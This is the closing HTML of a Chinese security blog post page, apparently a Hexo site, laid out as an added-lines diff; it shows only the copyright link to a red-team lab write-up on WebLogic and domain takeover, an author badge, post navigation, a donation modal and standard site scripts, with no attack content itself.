+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="https://oceansec.github.io/2023/12/05/%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98-%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E4%BB%8E%E5%A4%96%E7%BD%91%20Weblogic%20%E6%89%93%E8%BF%9B%E5%86%85%E7%BD%91%EF%BC%8C%E5%86%8D%E5%88%B0%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%8E%A5%E7%AE%A1%E5%9F%9F%E6%8E%A7/" title="漏洞靶场实战-红队靶场从外网 Weblogic 打进内网，再到约束委派接管域控" target="_blank" rel="external">https://oceansec.github.io/2023/12/05/漏洞靶场实战-红队靶场从外网 Weblogic 打进内网，再到约束委派接管域控/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/oceansec" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/oceansec" target="_blank"><span class="text-dark">Ocean</span><small class="ml-1x">Security researcher</small></a></h3>
+        <div>知其黑，守其白</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2023/12/05/%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC%E5%B0%8F%E6%80%BB%E7%BB%93/" title="邮件钓鱼小总结"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2023/12/05/%E6%9C%BA%E6%A2%B0%E9%9D%A9%E5%91%BDz2%E9%BB%91%E8%8B%B9%E6%9E%9C%E5%8F%8C%E7%B3%BB%E7%BB%9F%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/" title="机械革命z2黑苹果双系统改造计划"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>感谢您的支持，我会继续努力的!</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开支付宝扫一扫，即可进行扫码打赏哦</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开微信扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> 支付宝</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> 微信支付</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/oceansec" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
